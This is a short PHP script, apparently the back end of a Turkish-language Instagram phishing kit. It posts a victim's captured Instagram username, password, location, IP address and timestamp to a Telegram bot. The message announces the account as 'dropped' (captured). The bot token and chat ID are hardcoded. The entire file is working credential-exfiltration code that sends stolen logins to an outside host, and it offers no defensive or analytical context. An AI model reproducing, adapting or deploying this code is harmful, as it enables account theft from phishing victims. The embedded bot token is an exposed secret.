<?php

$token = "5782486642:AAGRGlB3rD4_9L5e_BaWV3RVNiEnbanQJ6Y";
 
$parametre= array(
'chat_id' => "-1001537014910",
'text' => "➡️Hesap Düştü 😜\n \n😋 https://instagram.com/$username\n🔐 Şifre : $password\n🏁 Konum : $ulke | $sehir\n🔗 IP Adresi : $ip\n⌛️ Tarih : $cur_time",
);
$ch = curl_init();
$url = "https://api.telegram.org/bot".$token."/sendmessage";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
  
?>